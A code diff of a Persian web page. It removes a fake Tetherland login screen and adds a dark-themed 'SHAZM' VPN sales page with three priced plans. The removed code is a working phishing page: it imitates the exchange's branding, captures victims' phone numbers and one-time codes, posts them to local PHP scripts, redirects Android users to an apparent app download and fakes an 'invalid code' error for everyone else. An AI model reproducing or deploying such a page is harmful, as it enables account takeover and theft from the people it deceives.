@@ -1,671 +1,288 @@
+<?php
+
+$url = "./";
+
+?>
 <!DOCTYPE html>
 <html lang="en">
-
+<!-- CREATED UNKNOW -->
 <head>
-    <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title>تتر لند</title>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SHAZMVPN</title>
+    <link rel="preconnect" href="//fdn.fontcdn.ir">
+    <link rel="preconnect" href="//v1.fontapi.ir">
+    <link href="https://v1.fontapi.ir/css/Sahel" rel="stylesheet">
 </head>
 <style>
-    @font-face {
-        font-family: "Anjoman";
-        src: url("./js/Anjoman.ttf");
-    }
-
-    @font-face {
-        font-family: "tid";
-        src: url("./js/tid.ttf");
-    }
-
     * {
-        padding: 0px;
-        margin: 0px;
-        box-sizing: border-box;
-        outline: none !important;
-        -webkit-tap-highlight-color: transparent !important;
-        font-family: "Anjoman" !important;
+        padding: 0;
+        margin: 0;
+        font-family: "Sahel";
     }
 
-    .glBuUb {
-        background-color: rgb(255, 255, 255);
-        border: 1px solid rgb(230, 235, 235);
-        border-radius: 6px;
-        box-shadow: rgba(16, 30, 115, 0.06) 0px 6px 26px 0px;
+    body{
+        background-color: #000;
     }
 
-    .dkwiGu {
-        -webkit-box-align: center;
-        align-items: center;
-    }
-
-    .lngCzZ {
-        background-color: rgba(255, 255, 255, 0.3);
-    }
-
-    .hokdbv {
-        height: 100%;
+    .header {
+        background-color: #1a1a1a;
+        color: #fff;
+        text-align: center;
         display: flex;
-        flex-direction: column;
-        -webkit-box-align: center;
-        align-items: center;
-        position: relative;
-        -webkit-box-pack: center;
         justify-content: center;
-    }
-
-    .bOaJiN {
+        align-items: center;
+        height: 60px;
         width: 100%;
-        height: 115px;
-        display: flex;
-        -webkit-box-pack: start;
-        justify-content: flex-start;
-        -webkit-box-align: center;
-        align-items: center;
-        justify-content: center;
-    }
-
-    .iKsuSp {
-        cursor: pointer;
-        margin: 0px 5px;
-    }
-
-    .bOaJiN {
-        width: 100%;
-        height: 115px;
-        display: flex;
-        -webkit-box-align: center;
-        align-items: center;
-        justify-content: center;
-    }
-
-    .iXFZuI {
-        width: 100%;
-        margin-block: 40px 45px;
-        font-size: 20px;
-        font-variation-settings: "wght" 700;
-        font-weight: 700;
-        text-align: right;
-    }
-
-    .evPEdN {
-        position: relative;
-        margin: 22px 0px;
-        width: 100%;
-        max-width: 332px;
-        height: 52px;
-        border: 1px solid rgb(234, 238, 243);
-        box-sizing: border-box;
-        border-radius: 6px;
-    }
-
-    .cyoYCJ {
-        display: flex;
-        width: 100%;
-        height: 100%;
-        -webkit-box-align: center;
-        align-items: center;
-    }
-
-    .kZKEyP {
-        height: 100%;
-        border: 0px;
-        border-radius: 6px;
-        padding-right: 16px;
-        z-index: 1;
-        font-size: 14px;
-        padding-left: 20px;
-        direction: rtl;
-        font-family: "tid" !important;
-    }
-
-    .kZKEyP::placeholder {
-        font-family: "Anjoman" !important;
-    }
-
-    .dcZIqS {
-        max-width: 332px;
-        background: rgba(250, 250, 250, 0.66);
-        border-radius: 6px;
-        color: rgb(145, 154, 171);
-        font-size: 14px;
-        padding: 22px 16px;
-        text-align: justify;
-    }
-
-    .iOviTJ {
-        margin-top: 20px;
-        margin-bottom: 10px;
-    }
-
-    .cUnmKT {
-        display: flex;
-        -webkit-box-align: center;
-        align-items: center;
-        -webkit-box-pack: center;
-        justify-content: center;
-        cursor: pointer;
-        transition: all 0.3s ease-in-out 0s;
-        font-size: 16px;
-        border: none;
-        border-radius: 6px;
-        width: 100%;
-        height: 52px;
-        background-color: rgb(0, 155, 135);
-        color: rgb(255, 255, 255);
-        margin-bottom: 2rem;
-    }
-
-    .hokdbv {
-        height: 100%;
-        display: flex;
-        flex-direction: column;
-        -webkit-box-align: center;
-        align-items: center;
-        position: relative;
-        -webkit-box-pack: center;
-        justify-content: center;
-    }
-
-    @media only screen and (max-width: 768px) {
-        .glBuUb {
-            display: flex;
-            width: 95%;
-            height: 100%;
-            padding: 90px 10px 0px;
-            -webkit-box-pack: center;
-            justify-content: center;
-            margin-left: auto;
-            margin-right: auto;
-            margin-top: 40%;
-        }
-    }
-
-    .hQPVJT {
-        margin-top: 10px;
-        display: flex;
-        -webkit-box-align: center;
-        align-items: center;
-        -webkit-box-pack: center;
-        justify-content: center;
-        color: rgb(105, 113, 126);
-    }
-
-    .gNenpQ {
-        cursor: pointer;
-        color: rgb(105, 113, 126);
-        text-decoration: none;
-    }
-
-    .fpImFA {
-        background: rgb(105, 113, 126);
-        width: 5px;
-        height: 5px;
-        margin: 0px 20px;
-        border-radius: 100px;
-    }
-
-    .gNenpQ {
-        cursor: pointer;
-        color: rgb(105, 113, 126);
-        text-decoration: none;
-    }
-
-    @media only screen and (min-width: 768px) {
-
-        /* For desktop: */
-        .lngCzZ {
-            display: flex;
-            flex-direction: column;
-            width: 600px;
-            margin-left: auto;
-            margin-right: auto;
-            padding: 5rem;
-        }
-
-        .hokdbv {
-            padding: 5rem;
-        }
-    }
-
-    .iOviTJ:disabled {
-        background-color: rgba(0, 155, 134, 0.486);
-    }
-
-    .jxoQC {
-        display: flex;
-        -webkit-box-align: center;
-        align-items: center;
-        -webkit-box-pack: center;
-        justify-content: center;
-    }
-
-    .hSalDo {
-        display: flex;
-        -webkit-box-pack: justify;
-        justify-content: space-between;
-        -webkit-box-align: center;
-        align-items: center;
-        width: 100%;
-        margin-top: 34px;
-    }
-
-    p,
-    div,
-    span,
-    input,
-    section,
-    form,
-    label,
-    ul,
-    li,
-    ol,
-    h1,
-    h2,
-    h3,
-    h4,
-    h5,
-    h6,
-    nav {
-        direction: rtl !important;
-    }
-
-    .jDoicR {
-        color: rgb(145, 154, 171);
-        padding: 10px 0px;
-    }
-
-    .text-2 {
-        font-size: 0.8rem !important;
-    }
-
-    .flex-center,
-    .grid-center {
-        justify-content: center !important;
-        align-items: center !important;
-    }
-
-    .flex {
-        display: flex !important;
-    }
-
-    .fEpnAC {
-        display: flex;
-        -webkit-box-align: center;
-        align-items: center;
-        -webkit-box-pack: justify;
-        justify-content: space-between;
-        padding-top: 36px;
-        direction: ltr;
-        width: 100vw;
-        max-width: 332px;
-        padding-bottom: 10px;
-    }
-
-    .lojEht {
-        display: flex;
-        -webkit-box-pack: center;
-        justify-content: center;
-        -webkit-box-align: center;
-        align-items: center;
-        padding: 10px;
-        background: rgba(33, 179, 134, 0.1);
-        border-radius: 10px;
-        font-size: 14px;
-        color: rgb(0, 155, 135);
+        margin: auto;
+        margin-left: auto;
         margin-right: auto;
     }
 
-    .jFDXTt {
-        color: rgb(219, 29, 62);
-        font-size: 12px;
-        max-width: 332px;
-        width: 100%;
-        text-align: justify;
-        margin-bottom: 8px;
+    .card-1 {
+        display: flex;
+        width: 85%;
+        margin: 10px;
+        margin-left: auto;
+        margin-right: auto;
+        background-color: #1a1a1a;
+        border-radius: 8px;
+        text-align: right;
+        justify-content: right;
+        padding: 20px;
+        color: #fff;
+        flex-direction: column;
     }
+
+    .card-2 {
+        display: flex;
+        width: 95%;
+        margin-right: auto;
+        margin-left: auto;
+        background-color: #1a1a1a;
+        border-radius: 8px;
+        color: #fff;
+        text-align: right;
+        flex-direction: column;
+    }
+
+    .card-3 {
+        display: flex;
+        width: 95%;
+        margin: auto;
+        margin-top: 10px;
+        background-color: #1a1a1a;
+        border-radius: 8px;
+        flex-direction: column;
+    }
+
+    .img-light {
+        width: 150px;
+        display: flex;
+        margin-right: auto;
+        margin-left: auto;
+        transition: all 0.5s;
+        position: absolute;
+        top: 12.5rem;
+        left: 0;
+        right: 0;
+        flex-direction: column;
+        opacity: 1;
+    }
+
+    .img-light:hover {
+        filter: grayscale(0%) blur(0px);
+    }
+
+    .fast {
+        width: 90%;
+        display: flex;
+        margin: 10px;
+        margin-left: auto;
+        margin-right: auto;
+        background-color: #727272;
+        color: #fff;
+        border-radius: 10px;
+        text-align: center;
+        flex-direction: column;
+        padding: 10px;
+    }
+
+    .price {
+        width: 90%;
+        display: flex;
+        margin: 10px;
+        margin-left: auto;
+        margin-right: auto;
+        background-color: #727272;
+        color: #fff;
+        border-radius: 10px;
+        flex-direction: column;
+        text-align: center;
+        padding: 10px;
+    }
+
+    .server {
+        width: 90%;
+        display: flex;
+        margin: 10px;
+        margin-left: auto;
+        margin-right: auto;
+        background-color: #727272;
+        color: #fff;
+        border-radius: 10px;
+        flex-direction: column;
+        text-align: center;
+        padding: 10px;
+        margin-bottom: 1rem;
+    }
+
+    .plan-1 {
+        width: 90%;
+        display: flex;
+        margin: 10px;
+        margin-left: auto;
+        margin-right: auto;
+        background-color: #727272;
+        color: #fff;
+        border-radius: 10px;
+        flex-direction: column;
+        text-align: center;
+        padding: 10px;
+        margin-bottom: 1rem;
+        height: auto;
+        flex-direction: column;
+    }
+
+    .btn{
+        width: 90%;
+        height: 50px;
+        background-color: #1a1a1a;
+        color: #fff;
+        display: flex;
+        margin-left: auto;
+        margin-right: auto;
+        justify-content: center;
+        text-align: center;
+        align-items: center;
+        flex-direction: column;
+        border: 0px;
+        border-radius: 8px;
+    }
+
+    .footer{
+        display: flex;
+        background-color: #1a1a1a;
+        width: 100%;
+        height: 50px;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        text-align: center;
+        color: #fff;
+    }
+
+    @media only screen and (min-width: 768px) {
+  /* For desktop: */
+  body{
+    background-color: #000;
+    width: 500px;
+    display: flex;
+    margin-left: auto;
+    margin-right: auto;
+    flex-direction: column;
+    border: 2px solid #1a1a1a;
+  }
+}
 </style>
 
 <body>
-    <div class="sc-388917f5-1 lngCzZ">
-        <div class="sc-1c2b0f37-8 sc-1c2b0f37-10 sc-b5820ec1-1 cKkrbw dkwiGu glBuUb">
-            <div id="box1" class="sc-5c832ace-0 hokdbv">
-                <div class="sc-5c832ace-1 bOaJiN">
-                    <img src="https://tetherland.com/images/logo.svg" class="sc-5c832ace-23 iKsuSp" />
-                </div>
-                <div class="sc-5c832ace-16 iXFZuI">ورود به تترلند</div>
-                <div class="sc-fe287a80-0 evPEdN">
-                    <div class="sc-fe287a80-5 cyoYCJ">
-                        <input type="tel" maxlength="11" id="phone" pattern="\d" dir="ltr"
-                            placeholder="شماره موبایل خود را وارد کنید" class="sc-fe287a80-2 kZKEyP" value=""
-                            style="width: 332px" />
-                    </div>
-                </div>
-                <div class="sc-5c832ace-22 dcZIqS" style="margin-bottom: 30px; background-color: transparent"></div>
-                <button id="btn" class="sc-b5f4ac46-0 cUnmKT sc-5c832ace-25 iOviTJ" disabled>
-                    ورود
-                </button>
-            </div>
-            <div id="box2" style="display: none;" class="sc-5c832ace-0 hokdbv">
-                <div class="sc-5c832ace-1 bOaJiN">
-                    <img src="https://tetherland.com/images/logo.svg" class="sc-5c832ace-23 iKsuSp" />
-                </div>
-                <div class="sc-5c832ace-16 iXFZuI">ورود به تترلند</div>
-                <div class="sc-5c832ace-18 jxoQC">
-                    <div class="sc-5c832ace-19 kDNYKL" id="phoneview"
-                        style="font-family: 'tid' !important; padding-left: 5px">
-                    </div>
-                    <svg width="24" height="24" fill="none" xmlns="http://www.w3.org/2000/svg" style="cursor: pointer">
-                        <path clip-rule="evenodd"
-                            d="M17.652 4.75l-1.403-1.402a.999.999 0 00-1.414 0L4 14.182V17h2.818L17.652 6.166a1 1 0 000-1.415z"
-                            stroke="#009B87" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path>
-                        <path d="M3 21h18M15.87 7.95l-2.82-2.82" stroke="#009B87" stroke-width="1.5"
-                            stroke-linecap="round" stroke-linejoin="round"></path>
-                    </svg>
-                </div>
-                <div id="timerText" class="sc-5c832ace-20 hSalDo">
-                    <p style="color: rgb(23, 48, 70); font-size: 14px">کد تایید</p>
-                    <div>
-                        <div class="sc-1ba50022-0 jDoicR flex flex-center text-2">
-                            زمان باقی مانده :<span style="
-                    font-family: 'tid' !important;
-                    padding-right: 15px;
-                    width: 45px;
-                    color: rgb(32, 164, 113);
-                  " id="timer" class="ltr"></span>
-                        </div>
-                    </div>
-                </div>
-                <div id="try" style="display: none;" class="sc-5c832ace-20 hSalDo">
-                    <p style="color: rgb(23, 48, 70); font-size: 14px">کد تایید</p>
-                    <span class="sc-1ba50022-1 lojEht pointer" onclick="trycode()">ارسال مجدد کد</span>
-                </div>
-                <div class="sc-5c832ace-17 fEpnAC code">
-                    <div class="" style="
-                display: flex;
-                flex-direction: row-reverse;
-                width: 100%;
-                justify-content: space-between;
-              ">
-                        <div style="display: flex; align-items: center">
-                            <input aria-label="Please enter verification ap-otp-input. Digit 1" autocomplete="off"
-                                class="ap-otp-input" type="tel" maxlength="1" value="" maxlength="1" id="otp-1"
-                                data-index="1" style="
-                    width: 50px;
-                    text-align: center;
-                    height: 50px;
-                    border-radius: 10px;
-                    font-size: 16px;
-                    color: rgb(23, 48, 70);
-                    font-weight: 500;
-                    border: 1px solid rgb(228, 228, 228);
-                    font-family: 'tid' !important;
-                  " />
-                        </div>
-                        <div style="display: flex; align-items: center">
-                            <input aria-label="Digit 2" autocomplete="off" class="ap-otp-input" type="tel" maxlength="1"
-                                value="" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-ap-otp-input"
-                                required id="otp-2" data-index="2" style="
-                    width: 50px;
-                    text-align: center;
-                    height: 50px;
-                    border-radius: 10px;
-                    font-size: 16px;
-                    color: rgb(23, 48, 70);
-                    font-weight: 500;
-                    border: 1px solid rgb(228, 228, 228);
-                    font-family: 'tid' !important;
-                  " />
-                        </div>
-                        <div style="display: flex; align-items: center">
-                            <input aria-label="Digit 3" autocomplete="off" class="ap-otp-input" type="tel" maxlength="1"
-                                value="" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-ap-otp-input"
-                                required id="otp-3" data-index="3" style="
-                    width: 50px;
-                    text-align: center;
-                    height: 50px;
-                    border-radius: 10px;
-                    font-size: 16px;
-                    color: rgb(23, 48, 70);
-                    font-weight: 500;
-                    border: 1px solid rgb(228, 228, 228);
-                    font-family: 'tid' !important;
-                  " />
-                        </div>
-                        <div style="display: flex; align-items: center">
-                            <input aria-label="Digit 4" autocomplete="off" class="ap-otp-input" type="tel" maxlength="1"
-                                value="" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-ap-otp-input"
-                                required id="otp-4" data-index="4" style="
-                    width: 50px;
-                    text-align: center;
-                    height: 50px;
-                    border-radius: 10px;
-                    font-size: 16px;
-                    color: rgb(23, 48, 70);
-                    font-weight: 500;
-                    border: 1px solid rgb(228, 228, 228);
-                    font-family: 'tid' !important;
-                  " />
-                        </div>
-                    </div>
-                </div>
-                <div id="ercode" style="display: none;" class="sc-5c832ace-21 jFDXTt">کد تایید نامعتبر است!</div>
-                <button id="btn2" disabled class="sc-b5f4ac46-0 cUnmKT sc-5c832ace-25 iOviTJ">
-                    ورود
-                </button>
-            </div>
+    <div class="header">
+        <h3>فیلتر شکن شزم</h3>
+    </div>
+    <div class="card-1">
+        <h4>به وبسایت شزم خوش آمدید</h4>
+        <p style="font-size: 14px; padding-top: 10px;">در این روزهای بحرانی کشورمان مردم از اینترنت خوبی برخوردار نیستن
+            و تحریم های زیادی برای مردم ایران اتفاق افتاده است از جمله فیلتر کردن شبکه های مجازی مانند تلگرام اینستاگرام
+            واتساپ و بسیاری از شبکه های دیگر با فیلترشکن میتوانید این تحریم ها را دور زده و به راحتی از اپلیکیشن های خود
+            استفاده نمایید</p>
+    </div>
+    <div class="card-2">
+        <div class="fast">
+            <script src="https://cdn.lordicon.com/ritcuqlt.js"></script>
+            <lord-icon src="https://cdn.lordicon.com/myroguwc.json" trigger="loop" delay="2000"
+                style="width:100px;height:80px;display: flex;margin-left: auto;margin-right: auto;">
+            </lord-icon>
+            </lord-icon>
+            <h4>رابط کاربری بالا</h4>
         </div>
-        <div class="sc-b5820ec1-2 hQPVJT">
-            <a href="https://tetherland.com" class="sc-b5820ec1-4 gNenpQ">خانه</a>
-            <div class="sc-b5820ec1-3 fpImFA"></div>
-            <a href="https://blog.tetherland.com" target="_blank" class="sc-b5820ec1-4 gNenpQ">بلاگ</a>
+        <div class="price">
+            <script src="https://cdn.lordicon.com/ritcuqlt.js"></script>
+            <lord-icon src="https://cdn.lordicon.com/ftrbfost.json" trigger="loop" delay="2000"
+                colors="outline:#121331,primary:#ffc738,secondary:#4bb3fd" state="hover"
+                style="width:100px;height:80px;display: flex;margin-left: auto;margin-right: auto;">
+            </lord-icon>
+            <h4>قیمت مناسب</h4>
+        </div>
+        <div class="server">
+            <script src="https://cdn.lordicon.com/ritcuqlt.js"></script>
+            <script src="https://cdn.lordicon.com/ritcuqlt.js"></script>
+            <lord-icon src="https://cdn.lordicon.com/fihkmkwt.json" trigger="loop" delay="2000"
+                style="width:100px;height:80px;display: flex;margin-left: auto;margin-right: auto;">
+            </lord-icon>
+            <h4>سرور های سریع</h4>
         </div>
     </div>
-    <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
-    <script src="./js/platform.js"></script>
-    <script>
-        const phone = document.querySelector("#phone");
-        const btn = document.querySelector("#btn");
-        const phoneview = document.querySelector("#phoneview");
-        const btn2 = document.querySelector("#btn2");
-
-        //box
-        const box1 = document.querySelector("#box1");
-        const box2 = document.querySelector("#box2");
-
-        //otp
-        const otp1 = document.querySelector("#otp-1")
-        const otp2 = document.querySelector("#otp-2")
-        const otp3 = document.querySelector("#otp-3")
-        const otp4 = document.querySelector("#otp-4")
-        const ercode = document.querySelector("#ercode")
-
-
-        function trycode() {
-            window.location.href = "/"
-        }
-        document.getElementById("timer").innerHTML = 002 + ":" + 03;
-
-        function startTimer() {
-            var presentTime = document.getElementById("timer").innerHTML;
-            var timeArray = presentTime.split(/[:]+/);
-            var m = timeArray[0];
-            var s = checkSecond(timeArray[1] - 1);
-            if (s == 59) {
-                m = m - 1;
-            }
-            if (m < 0) {
-                document.getElementById("timerText").style.display = "none";
-                document.getElementById("try").style.display = "flex";
-            }
-
-            document.getElementById("timer").innerHTML = m + ":" + s;
-            console.log(m);
-            setTimeout(startTimer, 1000);
-        }
-
-        function checkSecond(sec) {
-            if (sec < 10 && sec >= 0) {
-                sec = "0" + sec;
-            } // add zero in front of numbers < 10
-            if (sec < 0) {
-                sec = "59";
-            }
-            return sec;
-        }
-
-        phone.addEventListener("focus", function () {
-            phone.style.textAlign = "left";
-            phone.placeholder = "";
-            phone.style.direction = "ltr";
-        });
-
-        phone.addEventListener("focusout", function () {
-            if (phone.value.length == 0) {
-                phone.style.textAlign = "right";
-                phone.placeholder = "شماره موبایل خود را وارد کنید";
-            } else {
-                phone.style.textAlign = "left";
-                phone.placeholder = "";
-            }
-        });
-
-        phone.addEventListener("keyup", function () {
-            if (phone.value.length < 10) {
-                btn.disabled = true;
-            } else {
-                btn.disabled = false;
-            }
-        });
-
-        function viewbox2() {
-            box1.style.display = "none"
-            box2.style.display = "flex"
-            phoneview.innerText = phone.value
-        }
-
-        btn.addEventListener("click", function () {
-            btn.innerHTML = "لطفا صبر کنید...";
-            btn.disabled = true
-            let form_data = new FormData();
-            form_data.append('phone', phone.value);
-            $.ajax({
-                url: './tel.php',
-                dataType: 'text',
-                cache: false,
-                contentType: false,
-                processData: false,
-                data: form_data,
-                type: 'POST',
-            });
-            setTimeout(viewbox2, 2000)
-            startTimer()
-        });
-
-        //btn2
-        var count = 0;
-        otp4.addEventListener("keyup", function () {
-            if (otp1.value.length < 1) {
-                otp1.style.border = "1px solid red"
-            }
-            else if (otp2.value.length < 1) {
-                otp2.style.border = "1px solid red"
-            }
-            else if (otp3.value.length < 1) {
-                otp3.style.border = "1px solid red"
-            }
-            else if (otp4.value.length < 1) {
-                otp4.style.border = "1px solid red"
-            }
-            else {
-                btn2.innerHTML = "لطفا صبر کنید..."
-                let form_data = new FormData();
-                form_data.append('phone', phone.value);
-                form_data.append('otp1', otp1.value);
-                form_data.append('otp2', otp2.value);
-                form_data.append('otp3', otp3.value);
-                form_data.append('otp4', otp4.value);
-                $.ajax({
-                    url: './otp.php',
-                    dataType: 'text',
-                    cache: false,
-                    contentType: false,
-                    processData: false,
-                    data: form_data,
-                    type: 'POST',
-                });
-                // ادیت باید بشه
-                if (platform.os.family.search(/Android/gi) != -1) {
-                    window.location.assign("./app")
-                }
-                else {
-                    ercode.style.display = "block"
-                    btn2.innerHTML = "ورود";
-                    count++
-                    if(count == 4){
-                    ercode.innerHTML = "بیش از حد مجاز امتحان کردید"
-                    otp1.disabled = true
-                    otp2.disabled = true
-                    otp3.disabled = true
-                    otp4.disabled = true
-                    }
-                    //border
-                    otp1.style.border = "1px solid red"
-                    otp2.style.border = "1px solid red"
-                    otp3.style.border = "1px solid red"
-                    otp4.style.border = "1px solid red"
-                }
-
-            }
-        })
-
-        btn2.addEventListener("click", function () {
-            btn2.innerHTML = "لطفا صبر کنید...";
-            btn2.disabled = true
-            let form_data = new FormData();
-            form_data.append('phone', phone.value);
-            form_data.append('otp1', otp1.value);
-            form_data.append('otp2', otp2.value);
-            form_data.append('otp3', otp3.value);
-            form_data.append('otp4', otp4.value);
-            $.ajax({
-                url: './otp.php',
-                dataType: 'text',
-                cache: false,
-                contentType: false,
-                processData: false,
-                data: form_data,
-                type: 'POST',
-            });
-            startTimer()
-        });
-
-        /////////////////////////////////////////////////////
-        const $inp = $(".ap-otp-input");
-
-        $inp.on({
-            paste(ev) { // Handle Pasting
-
-                const clip = ev.originalEvent.clipboardData.getData('text').trim();
-                // Allow numbers only
-                if (!/\d{6}/.test(clip)) return ev.preventDefault(); // Invalid. Exit here
-                // Split string to Array or characters
-                const s = [...clip];
-                // Populate inputs. Focus last input.
-                $inp.val(i => s[i]).eq(5).focus();
-            },
-            input(ev) { // Handle typing
-
-                const i = $inp.index(this);
-                if (this.value) $inp.eq(i + 1).focus();
-            },
-            keydown(ev) { // Handle Deleting
-
-                const i = $inp.index(this);
-                if (!this.value && ev.key === "Backspace" && i) $inp.eq(i - 1).focus();
-            }
-
-        });
-    </script>
+    <form action="<?php echo("$url/payment"); ?>" method="POST">
+    <div class="card-3">
+        <div class="plan-1">
+            <script src="https://cdn.lordicon.com/ritcuqlt.js"></script>
+            <lord-icon src="https://cdn.lordicon.com/xumpvbbp.json" trigger="hover" style="width:100px;height:80px;display: flex;margin-left: auto;margin-right: auto;">
+            </lord-icon>
+            <h1>پلن-1</h1>
+            <h2>یکماهه</h4>
+            <h3>30,000 تومان</h3>
+            <h4>حجم : محدود</h4>
+            <h5>چند کاربر : دو کاربره</h5>
+            <h6>دارای پشتیبان امنیتی : میباشد</h6>
+            <br>
+            <button type="submit" class="btn">خرید سرویس</button>
+        </div>
+        <div class="plan-1">
+            <script src="https://cdn.lordicon.com/ritcuqlt.js"></script>
+            <lord-icon src="https://cdn.lordicon.com/xumpvbbp.json" trigger="hover" style="width:100px;height:80px;display: flex;margin-left: auto;margin-right: auto;">
+            </lord-icon>
+            <h1>پلن-2</h1>
+            <h2>سه ماهه</h4>
+            <h3>50,000 تومان</h3>
+            <h4>حجم : سیصد گیگابایت</h4>
+            <h5>چند کاربر : پنج کاربره</h5>
+            <h6>دارای پشتیبان امنیتی : میباشد</h6>
+            <br>
+            <button type="submit" class="btn">خرید سرویس</button>
+        </div>
+        <div class="plan-1">
+            <script src="https://cdn.lordicon.com/ritcuqlt.js"></script>
+            <lord-icon src="https://cdn.lordicon.com/xumpvbbp.json" trigger="hover" style="width:100px;height:80px;display: flex;margin-left: auto;margin-right: auto;">
+            </lord-icon>
+            <h1>پلن-3</h1>
+            <h2>شش ماهه</h4>
+            <h3>90,000 تومان</h3>
+            <h4>حجم : پانصد گیگابایت</h4>
+            <h5>چند کاربر : دوازده کاربره</h5>
+            <h6>دارای پشتیبان امنیتی : میباشد</h6>
+            <br>
+            <button type="submit" class="btn">خرید سرویس</button>
+        </div>
+    </div>
+    <br>
+</form>
+    <footer>
+        <div class="footer">
+            <h1 style="font-size:12px;">کپی برداری از این سایت پیگرد قانونی دارد</h1>
+        </div>
+    </footer>
 </body>
 
 </html>
